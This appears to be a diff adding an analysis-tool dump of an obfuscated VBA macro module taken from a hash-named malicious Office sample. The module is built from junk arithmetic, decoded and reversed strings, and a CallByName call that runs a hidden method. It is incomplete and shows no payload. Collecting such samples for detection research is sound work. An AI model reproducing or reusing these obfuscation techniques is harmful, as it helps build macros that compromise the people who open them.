@@ -1,0 +1,54 @@
+Filename     : ./macros/cb2532cb15bc085e00958e36905e95648c320de1933cdf5bfc7df94b59e9e0cf
+OLE stream   : Macros/VBA/dyeschis
+VBA filename : dyeschis.bas
+----------------------------------------
+Attribute VB_Name = "dyeschis"
+Function blkchick()
+blkchick = nokia5500
+End Function
+
+Function nokia5500()
+nokia5500 = minecassie(AVONINNINEHSARK.deleterrr)
+End Function
+
+Function divorce2(lintomen, obodysayme)
+divorce2 = timcurtis(Int((lintomen * bobplato()) + obodysayme))
+End Function
+
+Function timcurtis(liphmead)
+AVOGORIP = 50 + 91
+AVOGORIP = AVOGORIP * AVOGORI
+AVOGORIP = AVOGORIP - 44 * AVOGORIP - AVOGORIP - 6
+AVOGORIP = AVOGORIP * 100 - AVOGORI
+AVOGORIP = AVOGORIP * 7 - 56 - AVOGORI
+timcurtis = CInt(liphmead)
+End Function
+
+Sub kmvghjie(filedonald)
+water200 = "'mq"
+AVOGORIP = 50 + 91
+AVOGORIP = AVOGORIP * AVOGORI
+If 87 = 88 Then
+MsgBox "Hello open macros"
+End If
+AVOGORIP = AVOGORIP - 44 * AVOGORIP - AVOGORIP - 6
+AVOGORIP = AVOGORIP * 100 - AVOGORI
+AVOGORIP = AVOGORIP * 7 - 56 - AVOGORI
+CallByName filedonald, minecassie(water200), 1, jecturnb.rhinepru, 0, True
+End Sub
+
+Sub cassie688()
+gadferet.ROUTE601 = "LLACIPYT"
+End Sub
+
+Function spokeian(iceron23, larrymark)
+AVOGORIP = 50 + 91
+AVOGORIP = AVOGORIP * AVOGORI
+AVOGORIP = AVOGORIP - 44 * AVOGORIP - AVOGORIP - 6
+AVOGORIP = AVOGORIP * 100 - AVOGORI
+AVOGORIP = AVOGORIP * 7 - 56 - AVOGORI
+spokeian = minecassie(matmannb.catchvol) + larrymark + minecassie(matmannb.vovanina) + _
+larrymark + minecassie(matmannb.vehcivabuL) + iceron23 + _
+minecassie(AVONINNINEHSARK.saskiabmw + avosayta + AVONINNINEHSARK.strider0) + iceron23 + minecassie(AVONINNINEHSARK.saskiabmw)
+End Function
+
